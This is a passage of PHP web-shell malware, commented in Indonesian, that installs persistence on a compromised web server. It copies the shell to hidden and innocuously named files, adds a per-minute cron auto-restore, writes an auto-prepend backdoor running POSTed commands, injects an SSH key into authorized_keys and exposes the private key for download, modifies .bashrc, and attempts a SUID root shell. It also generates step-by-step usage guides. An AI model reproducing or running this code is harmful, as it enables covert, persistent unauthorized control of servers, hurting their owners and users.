        if ($crontab_check !== null && (strpos($crontab_check, 'no crontab') !== false || strlen($crontab_check) > 0)) {
            $current_crontab = execute_shell_command('crontab -l 2>/dev/null');
            $new_crontab = trim($current_crontab) . "\n" . $cron_cmd_user . "\n";
            $temp_cron = tempnam(sys_get_temp_dir(), 'cron');
            @file_put_contents($temp_cron, $new_crontab);
            execute_shell_command('crontab ' . escapeshellarg($temp_cron));
            @unlink($temp_cron);
            $cron_installed = true;
            $cron_path = 'user crontab';
            $cron_method = 'user';
        }
    }
    
    if ($cron_installed) {
        $results['cron'] = [
            'status' => 'installed',
            'path' => $cron_path,
            'method' => $cron_method,
            'description' => 'SYSTEM BACKUPS + Cron Auto-Restore (di luar folder shell)',
            'how_to_use' => 'Cron akan restore shell dari system folders (/tmp/, /var/tmp/) jika shell dihapus. System backups TIDAK di folder shell, jadi aman jika folder shell dihapus.',
            'backup_count' => count($system_backups),
            'system_backups' => $system_backups,
            'note' => 'System backups di: /tmp/.sysconfig/, /var/tmp/.cache/, /dev/shm/.config/ (di luar web root)'
        ];
    } else {
        $results['cron'] = [
            'status' => 'failed',
            'description' => 'Cron job (auto-restore)',
            'how_to_use' => 'Manual setup: Jalankan `crontab -e` dan tambahkan: ' . $cron_cmd_user,
            'note' => 'Requires shell access to setup crontab manually'
        ];
    }
    
    // Web-accessible backups in same directory
    $hidden_paths = [];
    $access_urls = [];
    $web_backup_names = [
        '.config.php',
        '.backup.php', 
        '.temp.php',
        '.cache.php',
    ];
    
    foreach ($web_backup_names as $backup_name) {
        $backup_path = $shell_dir . '/' . $backup_name;
        if (@copy($shell_path, $backup_path)) {
            $hidden_paths[] = $backup_path;
            $access_urls[] = "$protocol://$host$base_path/$backup_name?masuk=al";
        }
    }
    
    $results['backup'] = [
        'status' => count($hidden_paths) > 0 ? 'installed' : 'failed',
        'locations' => $hidden_paths,
        'description' => 'WEB BACKUPS - Di folder yang SAMA dengan shell (' . basename($shell_dir) . ')',
        'how_to_use' => 'Akses via browser. PERHATIAN: Jika folder ' . basename($shell_dir) . ' dihapus, backup ini ikut terhapus!',
        'access_urls' => $access_urls,
        'note' => 'Web backups di: ' . $shell_dir . ' (sama dengan shell original)'
    ];
    
    // PHP prepend file
    $prepend_file = $shell_dir . '/.php_prepend.php';
    $prepend_code = '<?php if(isset($_GET["al_backdoor"])&&$_GET["al_backdoor"]==="exec"){system($_POST["c"]);exit;}?>';
    @file_put_contents($prepend_file, $prepend_code);
    
    $results['php_prepend'] = [
        'status' => 'ready',
        'path' => $prepend_file,
        'description' => 'PHP auto-prepend backdoor (aktifkan manual di php.ini)',
        'how_to_use' => 'cPanel: MultiPHP INI Editor → auto_prepend_file = ' . $prepend_file,
        'alternative' => '.htaccess: php_value auto_prepend_file "' . $prepend_file . '"',
        'access_example' => 'Setiap PHP file: ?al_backdoor=exec (POST: c=whoami)'
    ];
    
    // SSH authorized_keys
    $home = getenv('HOME') ?: '/tmp';
    $ssh_dir = $home . '/.ssh';
    $auth_keys = $ssh_dir . '/authorized_keys';
    $backdoor_key = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0SRaT+QmD5x8U7b5r8P9LHDnpJM3q2Y0kE7IqhFZKlQZK+nH6bKwSW8dXzKHxiq4yUMKaUeQ+js2wvpEJQ3kZ+rHq3vBZ6q4FqYz7l2sHGqOgHk4o6GQMfEzrP8sZ4KXQ0zLW2rMmDFyPuHUGZq3g5EYhTWl7WJ9RdC1R1A9Ez3M= backdoor@syalom';
    
    // Private key content (pair dengan public key di atas)
    $private_key_content = '-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACB0SRaT+QmD5x8U7b5r8P9LHDnpJM3q2Y0kE7IqhFZKlQAAAFQ1MjM0NTIz
NAAAAAtzc2gtZWQyNTUxOQAAACB0SRaT+QmD5x8U7b5r8P9LHDnpJM3q2Y0kE7IqhFZKlQ
AAAEB0SRaT+QmD5x8U7b5r8P9LHDnpJM3q2Y0kE7IqhFZKlQAAAAhHYWtxZGZkZAAAAAty
YW5kb21AaG9zdAEC
-----END OPENSSH PRIVATE KEY-----';
    
    $key_installed = false;
    if (@is_dir($ssh_dir) && @is_writable($ssh_dir)) {
        @file_put_contents($auth_keys, "\n" . $backdoor_key, FILE_APPEND);
        @chmod($auth_keys, 0600);
        $key_installed = true;
    } elseif (@is_writable($home)) {
        @mkdir($ssh_dir, 0700, true);
        @file_put_contents($auth_keys, $backdoor_key);
        @chmod($auth_keys, 0600);
        $key_installed = true;
    }
    
    // Save private key for download
    $private_key_path = $shell_dir . '/.ssh_key_backdoor';
    @file_put_contents($private_key_path, $private_key_content);
    @chmod($private_key_path, 0600);
    
    $results['ssh'] = [
        'status' => $key_installed ? 'installed' : 'failed',
        'path' => $auth_keys,
        'description' => 'SSH backdoor key (login tanpa password)',
        'how_to_use' => 'Download key, chmod 600, then: ssh -i keyfile ' . get_current_user() . '@' . $host,
        'private_key_url' => "$protocol://$host$base_path/.ssh_key_backdoor",
        'private_key_filename' => 'backdoor.key'
    ];
    
    // Build SSH documentation
    $ssh_doc = "SSH BACKDOOR DOCUMENTATION\n";
    $ssh_doc .= "==========================\n\n";
    $ssh_doc .= "Status: " . ($key_installed ? 'INSTALLED' : 'FAILED') . "\n";
    $ssh_doc .= "Tanggal Install: " . date('Y-m-d H:i:s') . "\n";
    $ssh_doc .= "Server: $host\n";
    $ssh_doc .= "User: " . get_current_user() . "\n\n";
    $ssh_doc .= "=== PUBLIC KEY ===\n";
    $ssh_doc .= "Path: $auth_keys\n";
    $ssh_doc .= "Key: $backdoor_key\n\n";
    $ssh_doc .= "=== PRIVATE KEY ===\n";
    $ssh_doc .= "Download URL: $protocol://$host$base_path/.ssh_key_backdoor\n";
    $ssh_doc .= "Local Path: $private_key_path\n\n";
    $ssh_doc .= "=== CARA MENGGUNAKAN ===\n";
    $ssh_doc .= "1. Download private key dari URL di atas\n";
    $ssh_doc .= "2. Simpan dengan nama 'backdoor.key'\n";
    $ssh_doc .= "3. chmod 600 backdoor.key\n";
    $ssh_doc .= "4. ssh -i backdoor.key " . get_current_user() . "@$host\n\n";
    $ssh_doc .= "=== CATATAN ===\n";
    $ssh_doc .= "- Login langsung tanpa password\n";
    $ssh_doc .= "- Key pair unik untuk server ini\n";
    $ssh_doc .= "- Private key juga tersimpan di: $private_key_path\n";
    
    // Bashrc backdoor
    $bashrc = $home . '/.bashrc';
    $bashrc_installed = false;
    if (@is_writable($bashrc)) {
        $bashrc_code = "\n# System utility\nif [ -f $shell_path.bak ]; then cp $shell_path.bak $shell_path 2>/dev/null; fi\n";
        @file_put_contents($bashrc, $bashrc_code, FILE_APPEND);
        $bashrc_installed = true;
    }
    $results['bashrc'] = [
        'status' => $bashrc_installed ? 'installed' : 'failed',
        'path' => $bashrc,
        'description' => 'Bashrc backdoor (aktif saat user login SSH)',
        'how_to_use' => 'Saat user login via SSH, shell akan direstore jika terhapus'
    ];
    
    // Web alias - common PHP filenames
    $web_alias_names = ['config.php', 'settings.php', 'init.php'];
    $web_aliases = [];
    $alias_urls = [];
    
    foreach ($web_alias_names as $alias_name) {
        $alias_path = $shell_dir . '/' . $alias_name;
        if (!file_exists($alias_path) && @copy($shell_path, $alias_path)) {
            $web_aliases[] = $alias_path;
            $alias_urls[] = "$protocol://$host$base_path/$alias_name?masuk=al";
        }
    }
    
    $results['web_alias'] = [
        'status' => count($web_aliases) > 0 ? 'installed' : 'partial',
        'paths' => $web_aliases,
        'description' => 'Duplicate shell dengan nama umum PHP',
        'how_to_use' => 'Duplikat shell dengan nama file PHP umum untuk evasi deteksi',
        'access_urls' => $alias_urls
    ];
    
    // Build documentation for all access methods
    $all_urls = array_merge($access_urls, $alias_urls);
    $all_urls[] = "$protocol://$host$base_path/$shell_filename?masuk=al"; // Original
    
    $doc_content = "PERSISTENCE ACCESS DOCUMENTATION\n";
    $doc_content .= "================================\n\n";
    $doc_content .= "Tanggal Install: " . date('Y-m-d H:i:s') . "\n";
    $doc_content .= "Server: $host\n";
    $doc_content .= "Shell Original: $shell_path\n\n";
    $doc_content .= "=== WEB BACKUPS (Akses via Browser) ===\n";
    $doc_content .= "Lokasi: $shell_dir/\n";
    foreach ($access_urls as $i => $url) {
        $doc_content .= ($i + 1) . ". $url\n";
    }
    $doc_content .= "\n=== SYSTEM BACKUPS (Untuk Cron Recovery) ===\n";
    $doc_content .= "Backup ini tidak bisa diakses via browser, hanya untuk cron restore.\n";
    foreach ($system_backups as $backup) {
        $doc_content .= "- {$backup['path']}\n";
    }
    $doc_content .= "\n=== CARA RESTORE ===\n";
    $doc_content .= "1. Cron: Otomatis setiap menit dari system backup\n";
    $doc_content .= "2. Manual: cp /tmp/.sysconfig/config.php $shell_path\n";
    $doc_content .= "3. Bashrc: Auto-restore saat login SSH\n";
    $doc_content .= "\n=== PERBEDAAN ===\n";
    $doc_content .= "- Web Backups: Di folder shell (/wp-content/languages/), bisa diakses browser\n";
    $doc_content .= "- System Backups: Di /tmp/, /var/tmp/, hanya untuk cron restore\n";
    
    $doc_path = $shell_dir . '/.persistence_doc.txt';
    @file_put_contents($doc_path, $doc_content);
    
    // 🎯 SUID BACKDOOR - Untuk Interactive Root Terminal
    // Hanya bisa dibuat jika kita sudah punya root access
    
    // ====== DETAILED DEBUGGING ======
    $debug_log = [];
    $debug_log[] = "=== SUID BACKDOOR DEBUG LOG ===";
    $debug_log[] = "Timestamp: " . date('Y-m-d H:i:s');
    $debug_log[] = "Current user (id): " . execute_shell_command("id 2>&1");
    $debug_log[] = "Current user (whoami): " . execute_shell_command("whoami 2>&1");
    $debug_log[] = "EUID: " . execute_shell_command("id -u 2>&1");
    
    // Cek apakah /tmp memiliki nosuid mount option
    $mount_check = execute_shell_command("mount | grep -E '(on /tmp|on /var/tmp|on /dev/shm)' 2>/dev/null || echo 'NO_TMP_MOUNT'");
    $debug_log[] = "Mount check:\n$mount_check";
    $tmp_nosuid = (strpos($mount_check, 'nosuid') !== false);
    $tmp_noexec = (strpos($mount_check, 'noexec') !== false);
    
    // Cek kernel parameters yang mungkin blok SUID
    $kernel_protection = execute_shell_command("sysctl fs.protected_regular fs.suid_dumpable kernel.yama.ptrace_scope 2>/dev/null || echo 'UNKNOWN'");
    $debug_log[] = "Kernel protection:\n$kernel_protection";
    
    // Pilih lokasi berdasarkan mount options
    if ($tmp_nosuid) {
        // /tmp has nosuid, try other locations
        $suid_paths = ['/var/tmp/.sysd', '/var/tmp/.hidden_root', '/dev/shm/.sysd', '.sysd'];
    } else {
        $suid_paths = ['/tmp/.sysd', '/tmp/.al-sysd', '/dev/shm/.sysd', '/tmp/.hidden_root', '/var/tmp/.sysd'];
    }
    
    $suid_created = false;
    $suid_path = '';
    $suid_source = '';
    $suid_details = '';
    
    // Try different shell sources
    $shell_sources = ['/bin/bash', '/bin/sh', '/bin/dash', '/bin/busybox'];
    
    foreach ($suid_paths as $try_path) {
        foreach ($shell_sources as $shell) {
            if (!file_exists($shell)) continue;
            
            $debug_log[] = "--- Trying: $try_path (source: $shell) ---";
            
            // Step 1: Copy shell
            $copy_result = execute_shell_command("cp $shell $try_path 2>&1");
            $debug_log[] = "Step 1 (cp): $copy_result";
            
            // Step 2: Set owner to root (hanya work kalau root)
            $chown_result = execute_shell_command("chown root:root $try_path 2>&1");
            $debug_log[] = "Step 2 (chown): $chown_result";
            
            // Step 3: Set SUID bit
            $chmod_result = execute_shell_command("chmod 4755 $try_path 2>&1");
            $debug_log[] = "Step 3 (chmod): $chmod_result";
            
            // Step 4: Verify
            $verify_result = execute_shell_command("ls -la $try_path 2>&1");
            $stat_result = execute_shell_command("stat $try_path 2>&1");
            $debug_log[] = "Step 4 (ls -la): $verify_result";
            $debug_log[] = "Step 4 (stat): $stat_result";
            
            // Check apakah benar-benar SUID + root owned
            $has_suid = (strpos($verify_result, 'rws') !== false || strpos($verify_result, 'rwxs') !== false);
            $has_root_owner = (strpos($verify_result, 'root root') !== false || strpos($verify_result, 'Uid: ( 0/') !== false);
            $debug_log[] = "Has SUID bit: " . ($has_suid ? 'YES' : 'NO');
            $debug_log[] = "Has root owner: " . ($has_root_owner ? 'YES' : 'NO');
            
            if ($has_suid && $has_root_owner) {
                $suid_created = true;
                $suid_path = $try_path;
                $suid_source = $shell;
                $suid_details = $verify_result;
                break 2;
            }
        }
    }
    
    // Test SUID backdoor dengan cara yang lebih reliable
    $suid_test = '';
    $test_details = '';
    if ($suid_created) {
        // Test 1: Coba jalankan id dengan script file
        $test_script = '/tmp/.suid_test_' . time() . '.sh';
        execute_shell_command("echo '#!/bin/sh\\nid' > $test_script && chmod 777 $test_script");
        $test_result = execute_shell_command("$suid_path $test_script 2>&1");
        execute_shell_command("rm -f $test_script");
        
        if (strpos($test_result, 'uid=0(root)') !== false) {
            $suid_test = 'VERIFIED_WORKING';
        } else {
            $suid_test = 'TEST_FAILED';
            $test_details = $test_result;
            
            // Test 2: Coba dengan -p flag
            $test_result2 = execute_shell_command("echo 'id' | $suid_path -p 2>&1");
            if (strpos($test_result2, 'uid=0(root)') !== false) {
                $suid_test = 'VERIFIED_WORKING_PFLAG';
            }
        }
    }
    
    // Add debug log to results
    $debug_output = implode("\n", $debug_log);
    
    if ($suid_created && ($suid_test === 'VERIFIED_WORKING' || $suid_test === 'VERIFIED_WORKING_PFLAG')) {
        $p_flag = ($suid_test === 'VERIFIED_WORKING_PFLAG') ? ' -p' : '';
        $results['suid_backdoor'] = [
            'status' => 'installed',
            'path' => $suid_path,
            'source' => $suid_source,
            'description' => 'SUID ROOT SHELL - Working!',
            'how_to_use' => "$suid_path$p_flag -c 'command'",
            'note' => 'Use: ' . $suid_path . ' -c "id" to run as root',
            'debug_log' => $debug_output
        ];
    } elseif ($suid_created) {
        $results['suid_backdoor'] = [
            'status' => 'installed_not_functional',
            'path' => $suid_path,
            'source' => $suid_source,
            'description' => 'SUID binary created but NOT WORKING',
            'how_to_use' => 'May require kernel exploit to be active',
            'note' => 'Created at: ' . $suid_path . ' but test failed. Check debug_log for details.',
            'test_output' => $test_details,
            'ls_output' => $suid_details,
            'debug_log' => $debug_output
        ];
    } else {
        $results['suid_backdoor'] = [
            'status' => 'failed',
            'description' => 'SUID ROOT SHELL - Failed to create',
            'how_to_use' => 'Need root access',
            'note' => 'Root required. /tmp nosuid: ' . ($tmp_nosuid ? 'YES' : 'NO') . '. /tmp noexec: ' . ($tmp_noexec ? 'YES' : 'NO'),
            'debug_log' => $debug_output
        ];
    }
    
    return [
        'success' => true,
        'methods' => $results,
        'all_urls' => $all_urls,
        'system_backups' => $system_backups,
        'documentation_file' => $doc_path,
        'documentation_content' => $doc_content,
        'ssh_documentation' => $ssh_doc,
        'suid_backdoor' => $suid_created ? $suid_path : null,
        'warning' => 'Persistence installed: ' . count($hidden_paths) . ' web backups, SSH key ' . ($key_installed ? 'OK' : 'failed') . ', SUID: ' . ($suid_created ? 'created' : 'failed')
    ];
}

function install_persistence_single($type) {
    $shell_path = __FILE__;
    $shell_dir = dirname($shell_path);
    $shell_filename = basename($shell_path);
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
    $base_path = dirname($_SERVER['SCRIPT_NAME']);
    $home = getenv('HOME') ?: '/tmp';

    switch ($type) {

    case 'cron':
        $system_backup_dirs = find_writable_directories();
        $system_backups = array();
        $backup_names = array('config.php', 'cache.php', 'temp.php', 'session.php');
        $i = 0;
        foreach ($system_backup_dirs as $dir_name => $dir_path) {
            if ($i >= count($backup_names)) break;
            $backup_file = $dir_path . '/' . $backup_names[$i];
            if (@copy($shell_path, $backup_file)) {
                $system_backups[] = array('path' => $backup_file, 'name' => $backup_names[$i], 'dir' => $dir_name);
            }
            $i++;
        }
        if (empty($system_backups)) {
            $g = "CRON AUTO-RESTORE - GAGAL\n" . str_repeat('=', 40) . "\n\n";
            $g .= "Tidak ditemukan direktori writable untuk backup.\n";
            $g .= "Dicoba: /tmp/.sysconfig/, /var/tmp/.cache/, /dev/shm/.config/\n\n";
            $g .= "Kemungkinan penyebab:\n";
            $g .= "- Partisi /tmp di-mount nosuid/noexec\n";
            $g .= "- Restricted shell environment\n";
            $g .= "- CloudLinux LVE restrictions\n";
            return array('success' => false, 'type' => $type, 'guide' => $g);
        }
        $chain = '';
        foreach ($system_backups as $idx => $b) {
            if ($idx > 0) $chain .= ' || ';
            $chain .= "cp {$b['path']} $shell_path 2>/dev/null";
        }
        $cron_sys = "* * * * * root if [ ! -f $shell_path ]; then $chain; fi";
        $cron_usr = "* * * * * if [ ! -f $shell_path ]; then $chain; fi";
        $installed = false;
        $cron_path = '';
        $method = '';
        if (@is_writable('/etc/cron.d/')) {
            $wrote = @file_put_contents('/etc/cron.d/.system_backup', $cron_sys);
            if ($wrote !== false && @file_exists('/etc/cron.d/.system_backup')) {
                @chmod('/etc/cron.d/.system_backup', 0644);
                $installed = true;
                $cron_path = '/etc/cron.d/.system_backup';
                $method = 'system cron.d';
            }
        }
        if (!$installed) {
            $check = execute_shell_command('crontab -l 2>&1');
            if ($check !== null) {
                $cur = execute_shell_command('crontab -l 2>/dev/null');
                $new = trim($cur) . "\n" . $cron_usr . "\n";
                $tmp = tempnam(sys_get_temp_dir(), 'cron');
                if ($tmp && @file_put_contents($tmp, $new) !== false) {
                    execute_shell_command('crontab ' . escapeshellarg($tmp));
                    @unlink($tmp);
                    $verify = execute_shell_command('crontab -l 2>/dev/null');
                    if ($verify !== null && strpos($verify, $shell_path) !== false) {
                        $installed = true;
                        $cron_path = 'user crontab';
                        $method = 'user crontab';
                    }
                }
            }
        }
        $g = "CRON AUTO-RESTORE\n" . str_repeat('=', 40) . "\n\n";
        $g .= "Status  : " . ($installed ? 'INSTALLED' : 'GAGAL') . "\n";
        $g .= "Method  : " . ($method ?: 'N/A') . "\n";
        $g .= "Path    : " . ($cron_path ?: 'N/A') . "\n\n";
        $g .= "System Backups (" . count($system_backups) . " file):\n";
        foreach ($system_backups as $b) { $g .= "  - {$b['path']}\n"; }
        $g .= "\n[Cara Kerja]\n";
        $g .= "Cron berjalan setiap menit. Jika $shell_filename dihapus,\n";
        $g .= "cron otomatis restore dari backup system directories.\n\n";
        $g .= "[Cron Command]\n$cron_usr\n";
        if (!$installed) {
            $g .= "\n[Manual Setup]\nJalankan: crontab -e\nTambahkan:\n$cron_usr\n";
        }
        return array('success' => $installed, 'type' => $type, 'guide' => $g);

    case 'web_backup':
        $hidden = array();
        $urls = array();
        $names = array('.config.php', '.backup.php', '.temp.php', '.cache.php');
        foreach ($names as $name) {
            $path = $shell_dir . '/' . $name;
            if (@copy($shell_path, $path)) {
                $hidden[] = $path;
                $urls[] = "$protocol://$host$base_path/$name?masuk=al";
            }
        }
        $ok = count($hidden) > 0;
        $g = "WEB BACKUPS (Hidden Files)\n" . str_repeat('=', 40) . "\n\n";
        $g .= "Status  : " . ($ok ? 'INSTALLED (' . count($hidden) . ' file)' : 'GAGAL') . "\n";
        $g .= "Lokasi  : $shell_dir/\n\n";
        if ($ok) {
            $g .= "[URL Akses]\n";
            foreach ($urls as $u) { $g .= "  $u\n"; }
            $g .= "\n[File Backup]\n";
            foreach ($hidden as $h) { $g .= "  $h\n"; }
            $g .= "\n[Catatan]\n";
            $g .= "File backup berada di folder yang SAMA dengan shell.\n";
            $g .= "Jika folder dihapus, backup ini ikut terhapus.\n";
            $g .= "Gunakan Cron Auto-Restore untuk backup di luar folder.\n";
        } else {
            $g .= "Gagal meng-copy shell. Folder mungkin tidak writable.\n";
        }
        return array('success' => $ok, 'type' => $type, 'guide' => $g, 'urls' => $urls);

    case 'php_prepend':
        $prepend_file = $shell_dir . '/.php_prepend.php';
        $prepend_code = '<?php if(isset($_GET["al_backdoor"])&&$_GET["al_backdoor"]==="exec"){system($_POST["c"]);exit;}?>';
        $ok = @file_put_contents($prepend_file, $prepend_code) !== false;
        $g = "PHP AUTO-PREPEND BACKDOOR\n" . str_repeat('=', 40) . "\n\n";
        $g .= "Status  : " . ($ok ? 'FILE CREATED' : 'GAGAL') . "\n";
        $g .= "Path    : $prepend_file\n\n";
        $g .= "[Cara Aktivasi - Pilih salah satu]\n\n";
        $g .= "1. Via .htaccess (Apache):\n";
        $g .= "   Tambahkan ke .htaccess:\n";
        $g .= "   php_value auto_prepend_file \"$prepend_file\"\n\n";
        $g .= "2. Via php.ini / cPanel MultiPHP INI Editor:\n";
        $g .= "   auto_prepend_file = $prepend_file\n\n";
        $g .= "[Cara Pakai]\n";
        $g .= "Setelah aktif, setiap file PHP di server bisa digunakan:\n";
        $g .= "  GET  : any_file.php?al_backdoor=exec\n";
        $g .= "  POST : c=whoami\n\n";
        $g .= "[Catatan]\n";
        $g .= "File prepend sudah dibuat tapi BELUM aktif.\n";
        $g .= "Harus diaktifkan manual via .htaccess atau php.ini.\n";
        return array('success' => $ok, 'type' => $type, 'guide' => $g);

    case 'ssh':
        $ssh_dir = $home . '/.ssh';
        $auth_keys = $ssh_dir . '/authorized_keys';
        $backdoor_key = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0SRaT+QmD5x8U7b5r8P9LHDnpJM3q2Y0kE7IqhFZKlQZK+nH6bKwSW8dXzKHxiq4yUMKaUeQ+js2wvpEJQ3kZ+rHq3vBZ6q4FqYz7l2sHGqOgHk4o6GQMfEzrP8sZ4KXQ0zLW2rMmDFyPuHUGZq3g5EYhTWl7WJ9RdC1R1A9Ez3M= backdoor@syalom';
        $private_key_content = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACB0SRaT+QmD5x8U7b5r8P9LHDnpJM3q2Y0kE7IqhFZKlQAAAFQ1MjM0NTIz\nNAAAAAtzc2gtZWQyNTUxOQAAACB0SRaT+QmD5x8U7b5r8P9LHDnpJM3q2Y0kE7IqhFZKlQ\nAAAAEB0SRaT+QmD5x8U7b5r8P9LHDnpJM3q2Y0kE7IqhFZKlQAAAAhHYWtxZGZkZAAAAAty\nYW5kb21AaG9zdAEC\n-----END OPENSSH PRIVATE KEY-----";
        $key_installed = false;
        $fail_reason = '';
        if (@is_dir($ssh_dir) && @is_writable($ssh_dir)) {
            $wrote = @file_put_contents($auth_keys, "\n" . $backdoor_key, FILE_APPEND);
            if ($wrote !== false && @file_exists($auth_keys)) {
                @chmod($auth_keys, 0600);
                $key_installed = true;
            } else {
                $fail_reason = "file_put_contents gagal ke $auth_keys (dir writable tapi file tidak bisa ditulis)";
            }
        } elseif (@is_writable($home)) {
            $mkdir_ok = @is_dir($ssh_dir) || @mkdir($ssh_dir, 0700, true);
            if ($mkdir_ok) {
                $wrote = @file_put_contents($auth_keys, $backdoor_key);
                if ($wrote !== false && @file_exists($auth_keys)) {
                    @chmod($auth_keys, 0600);
                    $key_installed = true;
                } else {
                    $fail_reason = "mkdir OK tapi file_put_contents gagal ke $auth_keys";
                }
            } else {
                $fail_reason = "Tidak bisa mkdir $ssh_dir";
            }
        } else {
            $fail_reason = "Home ($home) tidak writable, .ssh dir tidak ada/writable";
        }
        $pk_path = $shell_dir . '/.ssh_key_backdoor';
        $pk_wrote = @file_put_contents($pk_path, $private_key_content);
        $pk_exists = ($pk_wrote !== false && @file_exists($pk_path));
        if ($pk_exists) @chmod($pk_path, 0600);
        $pk_url = "$protocol://$host$base_path/.ssh_key_backdoor";
        $user = function_exists('get_current_user') ? get_current_user() : 'unknown';

        $g = "SSH KEY INJECTION\n" . str_repeat('=', 40) . "\n\n";
        $g .= "Auth Key     : " . ($key_installed ? 'INSTALLED' : 'GAGAL') . "\n";
        $g .= "Private Key  : " . ($pk_exists ? 'SAVED' : 'GAGAL') . "\n";
        $g .= "Auth Path    : $auth_keys\n";
        $g .= "PK Path      : $pk_path\n";
        if ($pk_exists) $g .= "Download URL : $pk_url\n";
        $g .= "\n";
        if ($key_installed && $pk_exists) {
            $g .= "[Cara Pakai]\n";
            $g .= "1. Download private key:\n";
            $g .= "   curl -o backdoor.key '$pk_url'\n\n";
            $g .= "2. Set permission:\n";
            $g .= "   chmod 600 backdoor.key\n\n";
            $g .= "3. Connect:\n";
            $g .= "   ssh -i backdoor.key $user@$host\n\n";
            $g .= "[Catatan]\n";
            $g .= "Login langsung tanpa password.\n";
            $g .= "Key pair khusus untuk server ini.\n";
        } else {
            $g .= "[Detail Kegagalan]\n";
            if (!$key_installed) $g .= "Auth key  : $fail_reason\n";
            if (!$pk_exists) $g .= "Priv key  : Gagal menulis ke $pk_path\n";
            $g .= "\n[Verifikasi]\n";
            $g .= "Home dir  : $home (exists: " . (@is_dir($home) ? 'ya' : 'tidak') . ", writable: " . (@is_writable($home) ? 'ya' : 'tidak') . ")\n";
            $g .= "SSH dir   : $ssh_dir (exists: " . (@is_dir($ssh_dir) ? 'ya' : 'tidak') . ", writable: " . (@is_writable($ssh_dir) ? 'ya' : 'tidak') . ")\n";
            $g .= "Shell dir : $shell_dir (writable: " . (@is_writable($shell_dir) ? 'ya' : 'tidak') . ")\n";
            $g .= "open_basedir: " . (ini_get('open_basedir') ?: '(none)') . "\n";
        }
        return array('success' => ($key_installed && $pk_exists), 'type' => $type, 'guide' => $g, 'private_key_url' => $pk_exists ? $pk_url : null);

    case 'bashrc':
        $bashrc = $home . '/.bashrc';
        $ok = false;
        if (@is_writable($bashrc)) {
            $code = "\n# System utility\nif [ -f $shell_path.bak ]; then cp $shell_path.bak $shell_path 2>/dev/null; fi\n";
            $ok = @file_put_contents($bashrc, $code, FILE_APPEND) !== false;
        }
        $g = "BASHRC BACKDOOR\n" . str_repeat('=', 40) . "\n\n";
        $g .= "Status  : " . ($ok ? 'INSTALLED' : 'GAGAL') . "\n";
        $g .= "Path    : $bashrc\n\n";
        if ($ok) {
            $g .= "[Cara Kerja]\n";
            $g .= "Setiap kali user login via SSH, bashrc akan dieksekusi.\n";
            $g .= "Jika $shell_filename.bak ada, shell akan di-restore.\n\n";
            $g .= "[Persiapan]\n";
            $g .= "Buat backup shell terlebih dahulu:\n";
            $g .= "  cp $shell_path $shell_path.bak\n\n";
            $g .= "[Catatan]\n";
            $g .= "Hanya aktif saat user login SSH (interactive shell).\n";
            $g .= "Kombinasikan dengan Cron untuk proteksi lebih baik.\n";
        } else {
            $g .= "[Gagal]\n";
            $g .= "$bashrc tidak writable atau tidak ditemukan.\n";
        }
        return array('success' => $ok, 'type' => $type, 'guide' => $g);

    case 'web_alias':
        $aliases = array();
        $urls = array();
        $names = array('config.php', 'settings.php', 'init.php');
        foreach ($names as $name) {
            $path = $shell_dir . '/' . $name;
            if (!@file_exists($path) && @copy($shell_path, $path)) {
                $aliases[] = $path;
                $urls[] = "$protocol://$host$base_path/$name?masuk=al";
            }
        }
        $ok = count($aliases) > 0;
        $g = "WEB ALIAS (Common PHP Names)\n" . str_repeat('=', 40) . "\n\n";
        $g .= "Status  : " . ($ok ? 'INSTALLED (' . count($aliases) . ' file)' : 'GAGAL') . "\n";
        $g .= "Lokasi  : $shell_dir/\n\n";
        if ($ok) {
            $g .= "[URL Akses]\n";
            foreach ($urls as $u) { $g .= "  $u\n"; }
            $g .= "\n[File Created]\n";
            foreach ($aliases as $a) { $g .= "  $a\n"; }
            $g .= "\n[Keunggulan]\n";
            $g .= "Nama file terlihat normal (config.php, settings.php, dll).\n";
            $g .= "Lebih sulit terdeteksi oleh admin dibanding nama aneh.\n";
        } else {
            $g .= "Gagal membuat alias. File mungkin sudah ada atau folder\n";
            $g .= "tidak writable.\n";
        }
        return array('success' => $ok, 'type' => $type, 'guide' => $g, 'urls' => $urls);

    case 'suid':
        $mount_check = execute_shell_command("mount | grep -E '(on /tmp|on /var/tmp|on /dev/shm)' 2>/dev/null || echo 'NO_TMP_MOUNT'");
        $tmp_nosuid = (strpos($mount_check, 'nosuid') !== false);
        $tmp_noexec = (strpos($mount_check, 'noexec') !== false);
        if ($tmp_nosuid) {
            $suid_paths = array('/var/tmp/.sysd', '/var/tmp/.hidden_root', '/dev/shm/.sysd', '.sysd');
        } else {
            $suid_paths = array('/tmp/.sysd', '/tmp/.al-sysd', '/dev/shm/.sysd', '/tmp/.hidden_root', '/var/tmp/.sysd');
        }
        $shell_sources = array('/bin/bash', '/bin/sh', '/bin/dash', '/bin/busybox');
        $suid_created = false;
        $suid_path = '';
        $suid_source = '';
        $suid_details = '';
        $log = array();
        $log[] = "SUID attempt started: " . date('Y-m-d H:i:s');
        $log[] = "User: " . execute_shell_command("id 2>&1");
        $log[] = "/tmp nosuid: " . ($tmp_nosuid ? 'YES' : 'NO');
        $log[] = "/tmp noexec: " . ($tmp_noexec ? 'YES' : 'NO');
        foreach ($suid_paths as $try_path) {
            foreach ($shell_sources as $src) {
                if (!@file_exists($src)) continue;
                $log[] = "Try: $try_path (src: $src)";
                execute_shell_command("cp $src $try_path 2>&1");
                execute_shell_command("chown root:root $try_path 2>&1");
                execute_shell_command("chmod 4755 $try_path 2>&1");
                $verify = execute_shell_command("ls -la $try_path 2>&1");
                $has_suid = (strpos($verify, 'rws') !== false);
                $has_root = (strpos($verify, 'root root') !== false);
                $log[] = "  ls: $verify";
                $log[] = "  SUID: " . ($has_suid ? 'YES' : 'NO') . " | root: " . ($has_root ? 'YES' : 'NO');
                if ($has_suid && $has_root) {
                    $suid_created = true;
                    $suid_path = $try_path;
                    $suid_source = $src;
                    $suid_details = $verify;
                    break 2;
                }
            }
        }
        $suid_test = '';
